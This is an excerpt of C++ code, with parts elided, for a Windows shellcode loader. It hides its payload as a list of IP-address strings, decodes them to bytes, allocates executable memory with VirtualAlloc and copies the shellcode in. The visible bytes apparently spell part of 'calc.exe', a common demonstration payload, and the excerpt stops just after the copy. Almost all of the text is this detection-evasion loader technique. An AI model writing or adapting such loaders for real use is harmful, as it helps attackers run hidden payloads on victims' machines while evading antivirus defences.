...
int main() {
	...
	vector<string> ipPayload = {
		...
		"218.255.213.99","97.108.99.46","101.120.101.0" 
	};

	vector<unsigned char> byteArr = ipAddrToBytes(ipPayload);

	unsigned char* payload = new unsigned char[byteArr.size()];

	for (int i = 0; i < byteArr.size(); i++) {
		payload[i] = byteArr[i];
	}

	void* exec = VirtualAlloc(0, byteArr.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] Allocated memory for shellcode: %p\n", exec);

	system("pause");

	memcpy(exec, payload, byteArr.size());
